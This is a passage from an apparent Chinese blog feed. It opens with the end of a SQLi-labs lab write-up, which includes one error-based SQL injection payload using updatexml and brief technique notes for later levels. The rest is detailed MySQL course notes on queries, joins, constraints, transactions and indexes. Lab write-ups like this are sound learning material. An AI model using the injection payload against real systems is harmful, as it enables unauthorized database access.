class="code"><pre><code class="hljs matlab">?<span class="hljs-built_in">sort</span>=<span class="hljs-number">4</span>&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,database(),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) --+<br></code></pre></td></tr></table></figure><h3 id="Less-48-amp-49"><a href="#Less-48-amp-49" class="headerlink" title="Less 48 &amp; 49"></a>Less 48 &amp; 49</h3><p>两题均为盲注，均可使用延时注入</p><h3 id="Less-50-amp-51"><a href="#Less-50-amp-51" class="headerlink" title="Less 50 &amp; 51"></a>Less 50 &amp; 51</h3><p>两题均有报错信息，考虑报错注入</p><h3 id="Less-52-amp-53"><a href="#Less-52-amp-53" class="headerlink" title="Less 52 &amp; 53"></a>Less 52 &amp; 53</h3><p>无回显，选择盲注</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.51cto.com/u_13927568/5830763">https://blog.51cto.com/u_13927568/5830763</a><br><a href="https://blog.csdn.net/wang_624/article/details/101913584">https://blog.csdn.net/wang_624/article/details/101913584</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2023/07/10：夏令营week1记录:mysql笔记</title>
    <link href="/2023/07/13/mysql%E7%AC%94%E8%AE%B0/"/>
    <url>/2023/07/13/mysql%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="MySQL课堂笔记"><a href="#MySQL课堂笔记" class="headerlink" title="MySQL课堂笔记"></a>MySQL课堂笔记</h1><h2 id="0-标题暂定"><a href="#0-标题暂定" class="headerlink" title="0.标题暂定"></a>0.标题暂定</h2><h3 id="关于语句大小写"><a href="#关于语句大小写" class="headerlink" title="关于语句大小写"></a>关于语句大小写</h3><p>MySQL 在 windows 下是不区分大小写的，将 script 文件导入 MySQL 后表名也会自动转化为小写，结果再 想要将数据库导出放到 linux 服<br>务器中使用时就出错了。因为在 linux 下表名区分大小写而找不到表，查了很多都是说在 linux 下更改 MySQL 的设置使其也不区分大小写，但是<br>有没有办法反过来让 windows 下大小写敏感呢。其实方法是一样的，相应的更改 windows 中 MySQL 的设置就行了。</p><p>具体操作：<br>在 MySQL 的配置文件 my.ini 中增加一行：<br>lower_case_table_names = 0<br>其中 0：区分大小写，1：不区分大小写<br>MySQL 在 Linux 下数据库名、表名、列名、别名大小写规则是这样的：<br> 1、数据库名与表名是严格区分大小写的；<br> 2、表的别名是严格区分大小写的；<br> 3、列名与列的别名在所有的情况下均是忽略大小写的；<br> 4、变量名也是严格区分大小写的； MySQL 在 Windows 下都不区分大小写</p><h3 id="使用source-地址显示“Failed-to-open-file-‘…’-error-2”的可能原因"><a href="#使用source-地址显示“Failed-to-open-file-‘…’-error-2”的可能原因" class="headerlink" title="使用source + 地址显示“Failed to open file ‘…’, error: 2”的可能原因"></a>使用source + 地址显示“Failed to open file ‘…’, error: 2”的可能原因</h3><p>1.未先创建并”use”数据库；<br>2.在windows中，路径不能包含空格，中文字符，需使用“/”连接路径，且最好选择绝对路径；不可使用“.”以及“&lt;”和“&gt;”<br>3.该语句结尾不需分号<br>原文<a href="https://sebhastian.com/mysql-failed-to-open-file-error-2/">https://sebhastian.com/mysql-failed-to-open-file-error-2/</a><br><a href="https://philip.yurchuk.com/software/mysql-failed-to-open-file-error-2-and-22-on-windows/">https://philip.yurchuk.com/software/mysql-failed-to-open-file-error-2-and-22-on-windows/</a></p><h2 id="1-查看MYSQL版本"><a href="#1-查看MYSQL版本" class="headerlink" title="1.查看MYSQL版本"></a>1.查看MYSQL版本</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ mysql --version<br>$ mysql -V<br></code></pre></td></tr></table></figure><h2 id="2-创建及使用"><a href="#2-创建及使用" class="headerlink" title="2.创建及使用"></a>2.创建及使用</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ create database/table [name]<br>$ use [name]<br></code></pre></td></tr></table></figure><h2 id="3-查询使用的数据库"><a href="#3-查询使用的数据库" class="headerlink" title="3.查询使用的数据库"></a>3.查询使用的数据库</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ select database()<br></code></pre></td></tr></table></figure><h2 id="4-查询数据库版本"><a href="#4-查询数据库版本" class="headerlink" title="4.查询数据库版本"></a>4.查询数据库版本</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ select version()<br></code></pre></td></tr></table></figure><h2 id="5-终止输入语句"><a href="#5-终止输入语句" class="headerlink" title="5.终止输入语句"></a>5.终止输入语句</h2><p>键入 \c</p><h2 id="6-退出mysql"><a href="#6-退出mysql" class="headerlink" title="6.退出mysql"></a>6.退出mysql</h2><p>\q QUIT\EXIT<br>也可CTRL+C</p><h2 id="7-导入数据库"><a href="#7-导入数据库" class="headerlink" title="7.导入数据库"></a>7.导入数据库</h2><p>（创建并使用数据库后）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">source</span> [文件路径]（无需;）<br></code></pre></td></tr></table></figure><h2 id="8-查看"><a href="#8-查看" class="headerlink" title="8.查看"></a>8.查看</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ 表的结构 desc [table name]<br>$ 数据库 show databases<br>$ 查看表创建语句 show create table [table name]<br></code></pre></td></tr></table></figure><h2 id="9-简单查询"><a href="#9-简单查询" class="headerlink" title="9.简单查询"></a>9.简单查询</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ select [column name],[column name] from [table name]<br>$ select * from [table name]<br></code></pre></td></tr></table></figure><h2 id="10-别名"><a href="#10-别名" class="headerlink" title="10.别名"></a>10.别名</h2><p>可以采用 as 关键字重命名表字段，其实 as 也可以省略，如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ select empno <span class="hljs-string">&quot;员工编号&quot;</span>, ename <span class="hljs-string">&quot;员工姓名&quot;</span>, sal*12 （as）<span class="hljs-string">&quot;年薪&quot;</span> from emp<br></code></pre></td></tr></table></figure><h2 id="11-条件查询"><a href="#11-条件查询" class="headerlink" title="11.条件查询"></a>11.条件查询</h2><p>条件查询需要用到 where 语句，where 必须放到 from 语句表的后面<br>支持如下运算符<br>运算符             说明<br>=                  等于<br>&lt;&gt;或!=             不等于<br>&lt;                  小于<br>&lt;=                 小于等于<br>&gt;                 大于<br>&gt;=                 大于等于<br>between …and …. 两个值之间,等同于 &gt;= and &lt;=<br>is null         为 null（is not null 不为空）<br>and             并且<br>or                 或者<br>in                 包含，相当于多个 or（not in 不在这个范围中）如:select * from emp where job in (‘manager’,’salesman’);<br>not not            可以取非，主要用在 is 或 in 中<br>like             like称为模糊查询，支持%或下划线匹配<br>                %匹配任意个字符<br>                下划线，一个下划线只匹配一个字符<br>                例如：select * from emp where ename like ‘_A%’;</p><h2 id="12-排序"><a href="#12-排序" class="headerlink" title="12.排序"></a>12.排序</h2><p>排序采用 order by 子句，order by 后面跟上排序字段，排序字段可以放多个，多个采用逗号间隔，order by 默认采用升<br>序，如果存在 where 子句那么 order by 必须放到 where 语句的后面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ 升序：order by [column name] asc<br>$ 降序：order by [column name] desc<br></code></pre></td></tr></table></figure><h2 id="13-数据处理函数-单行处理函数"><a href="#13-数据处理函数-单行处理函数" class="headerlink" title="13.数据处理函数/单行处理函数"></a>13.数据处理函数/单行处理函数</h2><p>Lower         转换小写<br>upper         转换大写 如：upper(‘manager’)<br>substr        取子串（substr(被截取的字符串//[table name],起始下标,截取的长度)）<br>length           取长度 如：length([table name])<br>trim          去空格<br>str_to_date   将字符串转换成日期<br>                   如：select * from emp where HIREDATE=’1981-02-20’；<br>                （第二种方法，将字符串转换成 date 类型）<br>                select * from emp where HIREDATE=str_to_date(‘1981-02-20’,’%Y-%m-%d’);<br>                select * from emp where HIREDATE=str_to_date(‘02-20-1981’,’%m-%d-%Y’);<br>date_format   格式化日期 如：select empno, ename, date_format(hiredate, ‘%Y-%m-%d %H:%i:%s’) as hiredate from emp<br>format        设置千分位 如：select empno, ename, Format(sal, 0) from emp;<br>round         四舍五入  round(123.123)<br>rand()        生成随机数<br>Ifnull        可以将 null 转换成一个具体值<br>                如：ifnull(comm,0)<br>                  当comm为null替换为0</p><h2 id="14-日期格式"><a href="#14-日期格式" class="headerlink" title="14.日期格式"></a>14.日期格式</h2><p>now() 获得当前时间</p><h3 id="格式的说明"><a href="#格式的说明" class="headerlink" title="格式的说明"></a>格式的说明</h3><p>%Y：代表 4 位的年份<br>%y：代表 2 位的年份<br>%m：代表月, 格式为(01……12)<br>%c：代表月, 格式为(1……12)<br>%H：代表小时,格式为(00……23)<br>%h：代表小时,格式为(01……12)<br>%i：代表分钟, 格式为(00……59)<br>%r：代表 时间,格式为 12 小时(hh:mm:ss [AP]M)<br>%T：代表 时间,格式为 24 小时(hh:mm:ss)<br>%S：代表 秒,格式为(00……59)<br>%s：代表 秒,格式为(00……59)</p><h2 id="15-case-…-when-…-then-…-else-…end"><a href="#15-case-…-when-…-then-…-else-…end" class="headerlink" title="15.case … when … then …..else …end"></a>15.case … when … then …..else …end</h2><p>例如：<br>如果 job 为 MANAGERG 薪水上涨 10%,如果 job 为 SALESMAN 工资上涨 50%<br> select empno, ename, job, sal, case job when ‘MANAGER’ then sal<em>1.1 when ‘SALESMAN’ then sal</em>1.5 end as newsal from emp;</p><h2 id="16-分组函数-聚合函数-多行处理函数"><a href="#16-分组函数-聚合函数-多行处理函数" class="headerlink" title="16.分组函数/聚合函数/多行处理函数"></a>16.分组函数/聚合函数/多行处理函数</h2><p>未进行分组时整张表默认为一组<br>count      取得记录数   例如:count([table name]或*) *为一整行一个数据，这里相当于统计行数<br>sum        求和     注意：当例如select sum(sal+comm) from emp中comm中出现null,需替换null<br>avg        取平均<br>max        取最大的数<br>min        取最小的数</p><h3 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h3><p>1.分组函数自动忽略空值(null)，不需要手动的加 where 条件排除空值。<br>select count(*) from emp where xxx;     符合条件的所有记录总数。(一行数据，只要不全为null则count++，当然不存在全为null的数据，有一位不是null则数据有效)<br>select count(comm) from emp;            comm 这个字段中不为空的元素总数。<br>2.分组函数不能直接使用在 where 关键字后面。<br>错误示范： mysql&gt; select ename,sal from emp where sal &gt; avg(sal);<br>原因见分组查询<br>3.所有分组函数可组合使用</p><h2 id="17-分组查询（重点）"><a href="#17-分组查询（重点）" class="headerlink" title="17.分组查询（重点）"></a>17.分组查询（重点）</h2><h3 id="什么是分组"><a href="#什么是分组" class="headerlink" title="什么是分组"></a>什么是分组</h3><p>   在实际的应用中，可能有这样的需求，需要先进行分组，然后对每一组的数据进行操作。</p><h3 id="关键字执行顺序"><a href="#关键字执行顺序" class="headerlink" title="关键字执行顺序"></a>关键字执行顺序</h3><pre><code class="hljs">1. from2. where3. group by4. select5. order by</code></pre><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>1.分组函数不能在where后：因为分组函数在使用的时候必须先分组之后才能使用，where执行的时候，还没有分组。所以where后面不能出现分组函数。<br>2.select sum(sal) from emp; 这个没有分组，为啥sum()函数可以用呢？   因为select在group by之后执行。<br>3.在一条select语句当中，如果有group by语句的话，select后面只能跟：参加分组的字段，以及分组函数。其它的一律不能跟。<br>4.可多个字段联合分组</p><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h4 id="1-group-by"><a href="#1-group-by" class="headerlink" title="1.group by"></a>1.group by</h4><p>   例：select job,deptno,sum(sal) from emp group by job,deptno;</p><h4 id="2-having"><a href="#2-having" class="headerlink" title="2.having"></a>2.having</h4><p>   对分组数据再进行过滤需要使用 having 子句<br>     优先考虑where过滤<br>   例：select job, avg(sal) from emp group by job having avg(sal) &gt;2000;<br>   顺序：根据条件查询数据 分组 采用 having 过滤，取得正确的数据</p><h2 id="18-distinct"><a href="#18-distinct" class="headerlink" title="18.distinct"></a>18.distinct</h2><p>把查询结果去除重复记录<br>distinct只能出现在所有字段的最前方:<br>select ename,distinct job from emp为错误形式<br>允许该形式：<br>count(distinct job) </p><h2 id="19-连接查询"><a href="#19-连接查询" class="headerlink" title="19.连接查询"></a>19.连接查询</h2><p>也可以叫跨表查询，需要关联多个表进行查询</p><h3 id="连接分类"><a href="#连接分类" class="headerlink" title="连接分类"></a>连接分类</h3><p>可分为：<br>        内连接：  （无主次，平等）<br>            等值连接        例：select e.ename,d.dname from emp e join dept d on e.deptno = d.deptno;<br>            非等值连接    例：select e.ename, e.sal, s.grade from emp e join salgrade s on e.sal between s.losal and s.hisal; // 条件不是一个等量关系，称为非等值连接。<br>            自连接（技巧：视为多张表）例：select a.ename as ‘员工名’, b.ename as ‘领导名’ from emp a join emp b on a.mgr = b.empno; //员工的领导编号 = 领导的员工编号<br>        外连接：          （可在join前加outer,如right outer join ）<br>            左外连接（左连接）<br>            右外连接（右连接）right代表什么：表示将join关键字右边的这张表看成主表，主要是为了将<br>                                                                     这张表的数据全部查询出来，捎带着关联查询左边的表。<br>                                                                     在外连接当中，两张表连接，产生了主次关系。<br>        全连接</p><h3 id="SQL92与SQLl99"><a href="#SQL92与SQLl99" class="headerlink" title="SQL92与SQLl99"></a>SQL92与SQLl99</h3><h4 id="SQL92语法："><a href="#SQL92语法：" class="headerlink" title="SQL92语法："></a>SQL92语法：</h4><pre><code class="hljs">select     e.ename,d.dname from     emp e, dept dwhere    e.deptno = d.deptno;sql92的缺点：结构不清晰，表的连接条件，和后期进一步筛选的条件，都放到了where后面。</code></pre><h4 id="SQL99语法："><a href="#SQL99语法：" class="headerlink" title="SQL99语法："></a>SQL99语法：</h4><pre><code class="hljs">     select          ...     from        a    (inner) join    //inner可以省略（带着inner可读性更好！！！一眼就能看出来是内连接）        b     on        a和b的连接条件    where        筛选条件sql99优点：表连接的条件是独立的，连接之后，如果还需要进一步筛选，再往后继续添加where</code></pre><h2 id="20-多张表的连接查询"><a href="#20-多张表的连接查询" class="headerlink" title="20.多张表的连接查询"></a>20.多张表的连接查询</h2><p>语法：<br>select<br>    …<br> from<br>    a<br> join<br>    b<br> on<br>    a和b的连接条件<br> join<br>    c<br> on<br>    a和c的连接条件<br> right join<br>    d<br> on<br>    a和d的连接条件<br>   b,c,d并列<br>一条SQL中内连接和外连接可以混合。都可以出现</p><h2 id="21-子查询"><a href="#21-子查询" class="headerlink" title="21.子查询"></a>21.子查询</h2><p>子查询就是嵌套的 select 语句，可以理解为子查询是一张表</p><h3 id="where子查询"><a href="#where子查询" class="headerlink" title="where子查询"></a>where子查询</h3><p>格式：<br>select<br>        ..(select).<br>    from<br>        ..(select).<br>    where<br>        ..(select).<br>例：<br>第一步：查询最低工资是多少<br>select min(sal) from emp;<br>结果实例：<br>            +———-+<br>            | min(sal) |<br>            +———-+<br>            |   800.00 |<br>            +———-+<br>第二步：找出&gt;800的<br>select ename,sal from emp where sal &gt; 800;<br>第三步：合并<br>select ename,sal from emp where sal &gt; (select min(sal) from emp);</p><h3 id="from子查询"><a href="#from子查询" class="headerlink" title="from子查询"></a>from子查询</h3><p>注意：from后面的子查询，可以将子查询的查询结果当做一张临时表。<br>例：找出每个岗位的平均工资的薪资等级。<br>第一步：找出每个岗位的平均工资（按照岗位分组求平均值）<br>        select job,avg(sal) from emp group by job;<br>        +———–+————-+<br>        | job       | avgsal      |<br>        +———–+————-+   t表<br>        | ANALYST   | 3000.000000 |<br>        …<br>        +———–+————-+<br>第二步：克服心理障碍，把以上的查询结果就当做一张真实存在的表t。<br>        select * from salgrade;<br>    +——-+——-+——-+<br>    | GRADE | LOSAL | HISAL |<br>    +——-+——-+——-+   s表<br>    |     1 |   700 |  1200 |<br>    |     2 |  1201 |  1400 |<br>    …<br>    t表和s表进行表连接，条件：t表avg(sal) between s.losal and s.hisal;<br>        select<br>            t.*, s.grade<br>        from<br>            (select job,avg(sal) as avgsal from emp group by job) t<br>        join<br>            salgrade s<br>        on<br>            t.avgsal between s.losal and s.hisal;  // 技巧：avg(sal) as avgsal,否则t.avg(sal)报错</p><h3 id="select子查询（非重点）"><a href="#select子查询（非重点）" class="headerlink" title="select子查询（非重点）"></a>select子查询（非重点）</h3><p>对于select后面的子查询来说，这个子查询只能一次返回1条结果(就是括号里面那个)<br>例：<br> select e.ename,e.deptno,(select d.dname from dept d where e.deptno = d.deptno) as dname from emp e;</p><h2 id="22-union"><a href="#22-union" class="headerlink" title="22.union"></a>22.union</h2><p>union可以减少匹配的次数。在减少匹配次数的情况下，还可以完成两个结果集的拼接。<br>例：<br>select ename,job from emp where job = ‘MANAGER’<br>union<br>select ename,job from emp where job = ‘SALESMAN’;</p><h3 id="注意事项："><a href="#注意事项：" class="headerlink" title="注意事项："></a>注意事项：</h3><p>1.union在进行结果集合并的时候，要求两个结果集的列数相同（查询字段对应个数相同）。<br>2.不同于oracle，mysql允许结果集合并时列和列的数据类型不一致。</p><h2 id="23-limit"><a href="#23-limit" class="headerlink" title="23.limit"></a>23.limit</h2><p>将查询结果集的一部分取出来。通常使用在分页查询当中。分页的作用是为了提高用户的体验。</p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>完整用法：limit startIndex, length<br>        startIndex是起始下标，length是长度。<br>        起始下标从0开始。<br>缺省用法：limit 5; 这是取前5<br>     limit 1,2; 从第二条（下标为1）开始取两条数据<br>注意：mysql当中limit在order by之后执行</p><h3 id="分页"><a href="#分页" class="headerlink" title="分页"></a>分页</h3><p>每页显示3条记录<br>    第1页：limit 0,3        [0 1 2]<br>    第2页：limit 3,3        [3 4 5]<br>    …<br>每页显示pageSize条记录<br>    第pageNo页：limit (pageNo - 1) * pageSize  , pageSize<br>    public static void main(String[] args){<br>        // 用户提交过来一个页码，以及每页显示的记录条数<br>        int pageNo = 5; //第5页<br>        int pageSize = 10; //每页显示10条</p><pre><code class="hljs">    int startIndex = (pageNo - 1) * pageSize;    String sql = &quot;select ...limit &quot; + startIndex + &quot;, &quot; + pageSize;&#125;</code></pre><p>记公式：limit (pageNo-1)*pageSize , pageSize</p><h2 id="24-语句总结与运行顺序"><a href="#24-语句总结与运行顺序" class="headerlink" title="24.语句总结与运行顺序"></a>24.语句总结与运行顺序</h2><p>总：select … from … where … group by … having … order by … limit …<br>顺序：1.from 2.where 3.group by 4.having 5.select 6.order by 7.limit..</p><h2 id="25-建表"><a href="#25-建表" class="headerlink" title="25.建表"></a>25.建表</h2><h3 id="格式："><a href="#格式：" class="headerlink" title="格式："></a>格式：</h3><p>create table tableName(<br> columnName dataType(length),<br> ………………..<br> columnName dataType(length)<br>);</p><h3 id="MySQL常用数据类型"><a href="#MySQL常用数据类型" class="headerlink" title="MySQL常用数据类型"></a>MySQL常用数据类型</h3><p>类型<br>Char(长度)                            定长字符串，存储空间大小固定，适合作为主键或外键<br>Varchar(长度)                        变长字符串，存储空间等于实际数据空间<br>double(有效数字位数，小数位)     数值型<br>Float(有效数字位数，小数位)      数值型<br>Int(长度)                          整型<br>bigint(长度)                     长整型<br>Date                               日期型<br>BLOB                             Binary Large OBject（二进制大对象）<br>CLOB                             Character Large OBject（字符大对象）</p><h3 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h3><p>添加修改字段：alter table [table name] add [column name] <a href="length">datatype</a>;<br>            alter table [table name] modify [column name] <a href="length">datatype</a> ;<br>         alter table [table name] drop [column name];<br>表复制：create table … as …<br>删除表：drop table if [table name];// 如果这张表存在的话，删除<br>插入数据：insert into 表名(字段名1,字段名2,字段名3…) values(值1,值2,值3);字段名和值数量数据类型对应，没有给其它字段指定值的话，默认值是NULL。若省略前面的字段名，等于都写上，所以值也要都写上</p><h3 id="插入日期注意格式转换"><a href="#插入日期注意格式转换" class="headerlink" title="插入日期注意格式转换"></a>插入日期注意格式转换</h3><p>str_to_date(‘字符串日期’, ‘日期格式’)：将字符串varchar类型转换成date类型<br>date_format(日期类型数据, ‘日期格式’)：将date类型转换成具有一定格式的varchar字符串类型。<br>命名规范：所有的标识符都是全部小写，单词和单词之间使用下划线进行衔接。<br>mysql默认的日期格式：’%Y-%m-%d’<br>date是短日期：只包括年月日信息。默认：%Y-%m-%d<br>datetime是长日期：包括年月日时分秒信息。默认:%Y-%m-%d %h:%i:%s</p><h2 id="26-表的修改与删除"><a href="#26-表的修改与删除" class="headerlink" title="26.表的修改与删除"></a>26.表的修改与删除</h2><p>修改：update 表名 set 字段名称 1=需要修改的值 1, 字段名称 2=需要修改的值 2 where …<br>删除：Delete from 表名 where … 数据在硬盘上的真实存储空间不会被释放，可恢复<br>      truncate table 表名;  不可恢复，快速</p><h2 id="27-约束（重点）"><a href="#27-约束（重点）" class="headerlink" title="27.约束（重点）"></a>27.约束（重点）</h2><p>目的：创建表的时候，给表中的字段加上一些约束保证表中的数据有效完整</p><h3 id="类型："><a href="#类型：" class="headerlink" title="类型："></a>类型：</h3><p>非空约束：not null<br>唯一性约束: unique<br>主键约束: primary key （简称PK）<br>外键约束：foreign key（简称FK）<br>检查约束：check（mysql不支持，oracle支持）</p><h3 id="非空约束"><a href="#非空约束" class="headerlink" title="非空约束"></a>非空约束</h3><p>非空约束not null约束的字段不能为NULL。<br>例：create table t_vip(<br>        id int,<br>        name varchar(255) not null  // not null只有列级约束，没有表级约束！<br>    );</p><h3 id="唯一性约束"><a href="#唯一性约束" class="headerlink" title="唯一性约束"></a>唯一性约束</h3><p>唯一性约束unique约束的字段不能重复，但是可以为NULL。<br>例：create table t_vip(<br>        id int,<br>        name varchar(255) unique,<br>        email varchar(255)<br>    );</p><h3 id="表级约束"><a href="#表级约束" class="headerlink" title="表级约束"></a>表级约束</h3><p>需要给多个字段联合起来添加某一个约束的时候，需要使用表级约束。<br>例：create table t_vip(<br>                id int,<br>                name varchar(255),<br>                email varchar(255),<br>                unique(name,email)<br>)<br>在MySQL中，unique 和not null联合自动变成主键字段。例：name varchar(255) not null unique</p><h3 id="列级约束"><a href="#列级约束" class="headerlink" title="列级约束"></a>列级约束</h3><p>例：id int primary key</p><h3 id="主键约束（primary-key，简称PK）"><a href="#主键约束（primary-key，简称PK）" class="headerlink" title="主键约束（primary key，简称PK）"></a>主键约束（primary key，简称PK）</h3><p>主键字段：该字段上添加了主键约束，这样的字段叫做：主键字段<br>主键值：主键字段中的每一个值都叫做主键值，一般数字且定长<br>作用：主键值是每一行记录的唯一标识，相当于身份证号，任何一张表都应该有主键，没有主键，表无效<br>复合主键：primary key(id,name)多个字段联合起来做约束（不建议使用）<br>在mysql当中，有一种机制，可以帮助我们自动维护一个主键值<br>create table t_vip(<br>            id int primary key auto_increment, //auto_increment表示自增，从1开始，以1递增！<br>            name varchar(255)<br>        );</p><h3 id="外键约束"><a href="#外键约束" class="headerlink" title="外键约束"></a>外键约束</h3><p>外键主要是维护表之间的关系的，主要是为了保证参照完整性，如果表中的某个字段为外键字段，那么该字段的值必须来源于参照的表的字段<br>存在外键的表就是子表，参照的表就是父表，所以存在一个父子关系，也就是主从关系<br>删除表的顺序：先删子，再删父；<br>创建表的顺序：先创建父，再创建子。<br>删除数据的顺序：先删子，再删父。<br>插入数据的顺序：先插入父，再插入子。<br>子表中的外键引用的父表中的某个字段，被引用的这个字段不一定是主键，但至少具有unique约束。<br>外键值可为null<br>例：constraint [table name] foreign key([column name]) references [table name]([column name])<br>更改删除父表数据，子表也会变动</p><h3 id="约束的更改"><a href="#约束的更改" class="headerlink" title="约束的更改"></a>约束的更改</h3><p>删除：外键：alter table 表名 drop foreign key 外键字段;<br>     主键：alter table 表名 drop primary key;<br>         唯一：alter table 表名 drop index 字段名<br>添加： alter table 表名 add constraint 约束名 约束类型(字段名) [外键的引用]</p><h2 id="28-存储引擎（了解）"><a href="#28-存储引擎（了解）" class="headerlink" title="28.存储引擎（了解）"></a>28.存储引擎（了解）</h2><p>存储引擎是MySQL中特有的一个术语，实际上存储引擎是一个表存储/组织数据的方式。不同的存储引擎，表存储数据的方式不同。<br>在创建表时，可使用 ENGINE 选项为 CREATE TABLE 语句显式指定存储引擎。未指定则默认<br>常用引擎：MyISAM InnoDB MEMORY</p><h2 id="29-事务（重点）"><a href="#29-事务（重点）" class="headerlink" title="29.事务（重点）"></a>29.事务（重点）</h2><p>一个事务其实就是一个完整的业务逻辑。是一个最小的工作单元。不可再分。<br>本质上事务就是批量的DML语句（insert、delete、update 对数据进行更改）同时成功，或者同时失败</p><h3 id="事务工作过程"><a href="#事务工作过程" class="headerlink" title="事务工作过程"></a>事务工作过程</h3><p>InnoDB存储引擎：提供一组用来记录事务性活动的日志文件<br>在事务的执行过程中，每一条DML的操作都会记录到“事务性活动的日志文件”中。在事务的执行过程中，我们可以提交事务，也可以回滚事务。<br>提交事务：清空事务性活动的日志文件，将数据全部彻底持久化到数据库表中。标志着事务的结束。并且是一种全部成功的结束。<br>回滚事务：将之前所有的DML操作全部撤销，并且清空事务性活动的日志文件。标志着事务的结束。并且是一种全部失败的结束。</p><h3 id="事务执行"><a href="#事务执行" class="headerlink" title="事务执行"></a>事务执行</h3><p>开始事务：start transaction（关闭DML自动提交，此句开始保持上一次提交点）;<br>提交事务：commit; 语句<br>回滚事务：rollback; 语句（回滚永远都是只能回滚到上一次的提交点）<br>默认每执行一条DML自动提交</p><h3 id="事务特性"><a href="#事务特性" class="headerlink" title="事务特性"></a>事务特性</h3><p>原子性：说明事务是最小的工作单元。不可再分。<br>一致性：所有事务要求，在同一个事务当中，所有操作必须同时成功，或者同时失败，以保证数据的一致性。<br>隔离性：A事务和B事务之间具有一定的隔离。教室A和教室B之间有一道墙，这道墙就是隔离性。A事务在操作一张表的时候，另一个事务B也操作这张表会那样<br>持久性：事务最终结束的一个保障。事务提交，就相当于将没有保存到硬盘上的数据保存到硬盘上</p><h3 id="事务隔离性"><a href="#事务隔离性" class="headerlink" title="事务隔离性"></a>事务隔离性</h3><p>4个级别<br>读未提交：read uncommitted（最低的隔离级别）事务A可以读取到事务B未提交的数据。<br>读已提交：read committed （数据库隔离级别默认从此开始）事务A只能读取到事务B提交之后的数据。数据真实<br>可重复读：repeatable read （mysql中默认）事务A开启之后，不管是多久，每一次在事务A中读取到的数据都是一致的。即使事务B将数据已经修改，并且提交了，事务A读取到的数据还是没有发生改变<br>序列化/串行化：serializable（最高的隔离级别）事务排队，不能并发（我操作你停） synchronized，线程同步（事务同步）将一个事务与其他事务完全地隔离。效率最低</p><h3 id="一致性问题"><a href="#一致性问题" class="headerlink" title="一致性问题"></a>一致性问题</h3><p>脏读现象：读到脏数据（未提交的数据）<br>不可重复读：事务A开启之后，不管是多久，每一次在事务A中读取到的数据都是一致的。即使事务B将数据已经修改，并且提交了<br>幻像读：读到的数据可能不够绝对真实，即使事务B将数据已经修改，并且提交了，事务A读取到的数据还是没有发生改变</p><h3 id="隔离级别与一致性问题关系"><a href="#隔离级别与一致性问题关系" class="headerlink" title="隔离级别与一致性问题关系"></a>隔离级别与一致性问题关系</h3><p>隔离级别     脏读取     不可重复读        幻像读<br>读未提交     可能          可能            可能<br>读已提交    不可能       可能            可能<br>可重复读     不可能      不可能        对InnoDB不可能<br>序列化       不可能        不可能        不可能</p><h3 id="设置隔离级别"><a href="#设置隔离级别" class="headerlink" title="设置隔离级别"></a>设置隔离级别</h3><p>会话级：mysql&gt; SET TRANSACTION ISOLATION …；<br>            或：<br>       mysql&gt; SET SESSION TRANSACTION ISOLATION LEVEL …；<br>全局级：mysql&gt; SET GLOBAL TRANSACTION ISOLATION LEVEL …；</p><h3 id="查看隔离级别"><a href="#查看隔离级别" class="headerlink" title="查看隔离级别"></a>查看隔离级别</h3><p>mysql&gt; SELECT @@tx_isolation;或：<br>mysql&gt; SELECT @@session.tx_isolation;<br>– 查看全局级的当前隔离级别：<br>mysql&gt; SELECT @@global.tx_isolation;</p><h2 id="30-索引"><a href="#30-索引" class="headerlink" title="30.索引"></a>30.索引</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>索引是在数据库表的字段上添加的，是为了提高查询效率存在的一种机制。索引被用来快速找出在一个列上用一特定值的行。一张表的一个字段可以添加一个索引，当然，多个字段联合起来也可以添加索引。索引相当于一本书的目录，是为了缩小扫描范围而存在的一种机制。<br>MySQL在查询方面主要就是两种方式：第一种方式：全表扫描（无索引时的查找方式，效率较低）；第二种方式：根据索引检索。</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>在mysql当中索引是一个B-Tree数据结构。<br>遵循左小又大原则存放。采用中序遍历方式遍历取数据。<br>底层是一个自平衡的二叉树<br>注意：1.任何数据库主键自动添加索引，mysql如果有unique约束也会自动创建<br>2.在任何数据库当中，任何一张表的任何一条记录在硬盘存储上都有一个硬盘的物理存储编号<br>3.在mysql当中，索引是一个单独的对象，在mysql当中都是一个树的形式存在。（自平衡二叉树：B-Tree）不同存储引擎形式不同</p><h3 id="应用条件"><a href="#应用条件" class="headerlink" title="应用条件"></a>应用条件</h3><p>1.表中该字段中的数据量庞大<br>2.经常被检索，经常出现在 where 子句中的字段<br>3.经常被 DML 